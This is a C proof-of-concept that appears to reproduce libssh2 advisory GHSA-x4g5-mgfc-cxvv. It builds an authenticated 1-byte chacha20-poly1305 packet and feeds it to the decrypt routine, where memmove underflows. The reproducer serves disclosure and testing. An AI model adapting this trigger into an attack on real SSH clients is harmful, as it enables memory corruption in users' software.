/*
 * GHSA-x4g5-mgfc-cxvv reproducer (unit-level).
 *
 * A malicious server on a chacha20-poly1305 session sends an
 * authenticated packet whose (decrypted) length field is 1-3. The
 * transport hands the full packet body to the cipher's crypt() entry
 * with buf_len == packet_length, and the decrypt path strips the
 * 4-byte size field with memmove(buf, buf + 4, buf_len - 4), which
 * underflows to a huge size.
 *
 * This builds a genuinely authenticated 1-byte packet (encrypted with
 * the same key/seqno) and feeds it to the decrypt entry the same way
 * ssh2_transport_read() does.
 *
 * cc -I src -I include -I <build>/src chacha_poc.c <build>/src/libssh2.a
 */

#include "crypt.c"

int main(void)
{
    LIBSSH2_SESSION *session;
    const struct crypt_method *method = &crypt_method_chacha20_poly1305_openssh;
    unsigned char key[64];
    unsigned char packet[64];
    void *enc_abstract = NULL;
    void *dec_abstract = NULL;
    int free_iv = 0, free_secret = 0;
    int rc;
    int i;

    rc = libssh2_init(0);
    if(rc)
        return 1;

    session = libssh2_session_init();
    if(!session)
        return 1;

    for(i = 0; i < (int)sizeof(key); i++)
        key[i] = (unsigned char)(i * 7);

    /* the sending (malicious server) side and the receiving side share
       the negotiated key */
    rc = crypt_init_chacha20_poly(session, method, NULL, &free_iv,
                                  key, &free_secret, 1, &enc_abstract);
    if(rc)
        return 1;

    rc = crypt_init_chacha20_poly(session, method, NULL, &free_iv,
                                  key, &free_secret, 0, &dec_abstract);
    if(rc)
        return 1;

    /* build the packet the server wants to send: packet length field 1,
       holding a single padding-length byte. buf_len for the encrypt
       entry is 4 + packet_length. */
    memset(packet, 0, sizeof(packet));
    packet[4] = 4;  /* padding length byte */

    rc = crypt_encrypt_chacha20_poly_buffer(session, 0, packet, 5,
                                            &enc_abstract, 0);
    if(rc)
        return 1;

    /* now run the authenticated packet through the decrypt entry with
       buf_len == packet_length == 1, exactly like ssh2_transport_read()
       does for a full packet */
    rc = crypt_encrypt_chacha20_poly_buffer(session, 0, packet, 1,
                                            &dec_abstract, 0);
    printf("decrypt of length-1 packet: %s (rc %d)\n",
           rc ? "rejected" : "accepted", rc);

    crypt_dtor_chacha20_poly(session, &enc_abstract);
    crypt_dtor_chacha20_poly(session, &dec_abstract);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
